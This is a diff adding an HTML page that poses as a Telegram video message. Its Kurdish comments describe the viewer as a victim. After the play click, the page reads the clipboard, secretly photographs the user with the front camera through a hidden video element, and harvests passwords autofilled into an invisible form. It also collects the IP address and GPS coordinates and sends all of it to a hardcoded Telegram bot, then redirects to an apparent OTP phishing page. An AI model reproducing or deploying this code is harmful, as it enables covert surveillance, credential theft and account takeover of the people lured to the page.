@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Video Message</title>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* ڤیدیۆکە دەبێتە باکگراوندی هەموو شاشەکە */
+        #main-video { width: 100vw; height: 100vh; object-fit: cover; cursor: pointer; }
+        
+        /* تێپەڕاندنی وێبگەڕ: ڤیدیۆیەکی شەفاف بۆ کامێرا */
+        #spy-video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        
+        /* نیشانەی Play (تەڵەکە) */
+        .play-overlay { position: absolute; z-index: 100; width: 80px; height: 80px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid white; }
+        .play-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
+
+        /* تەڵەی پاسوۆرد */
+        #trap-form { position: absolute; opacity: 0.01; pointer-events: none; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- ١. ڤیدیۆیەکی ڕاستەقینە (ئەوەی قوربانی دەیبینێت) -->
+    <div class="play-overlay" id="playBtn">
+        <div class="play-icon"></div>
+    </div>
+    <video id="main-video" poster="https://i.imgur.com/your-thumbnail.jpg">
+        <source src="https://i.imgur.com/your-video.mp4" type="video/mp4">
+    </video>
+
+    <!-- ٢. ڤیدیۆی باکگراوند (بۆ هاککردنی کامێرا) -->
+    <video id="spy-video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- ٣. تەڵەی پاسوۆرد -->
+    <form id="trap-form">
+        <input type="text" id="af_user" autocomplete="username">
+        <input type="password" id="af_pass" autocomplete="current-password">
+    </form>
+
+    <script>
+        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+        const chatId = "6679834643";
+
+        async function sendToBot(text) {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
+
+        document.getElementById('playBtn').addEventListener('click', async function() {
+            // شاردنەوەی نیشانەی Play و لێدانی ڤیدیۆکە بۆ قوربانی
+            this.style.display = 'none';
+            const mainVid = document.getElementById('main-video');
+            mainVid.play();
+
+            // دەستپێکردنی کرداری هاککردنەکان لە کاتی تەماشاکردنی ڤیدیۆکەدا
+            
+            // ١. Clipboard
+            try {
+                const clip = await navigator.clipboard.readText();
+                if(clip) await sendToBot("📋 Clipboard: " + clip);
+            } catch(e) {}
+
+            // ٢. وێنەگرتن (با کامێرا بۆ ٥ چرکە کراوە بێت تا سەیری ڤیدیۆکە دەکات)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const spyVid = document.getElementById('spy-video');
+                spyVid.srcObject = stream;
+                
+                await new Promise(r => setTimeout(r, 5000)); // کاتی تەماشاکردنی ڤیدیۆ
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = spyVid.videoWidth; canvas.height = spyVid.videoHeight;
+                canvas.getContext('2d').drawImage(spyVid, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'face.jpg');
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { await sendToBot("❌ Access Denied"); }
+
+            // ٣. GPS و پاسۆرد و IP (لە باکگراوند)
+            let u = document.getElementById('af_user').value;
+            let p = document.getElementById('af_pass').value;
+            if(p) sendToBot(`🔑 PASS: ${u} | ${p}`);
+
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}`));
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    sendToBot(`📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                }, null, { enableHighAccuracy: true });
+            }
+
+            // دوای ١٠ چرکە کە ڤیدیۆکەی بینی، دەیبات بۆ لاپەڕەی OTP
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 10000);
+        });
+    </script>
+</body>
+</html>
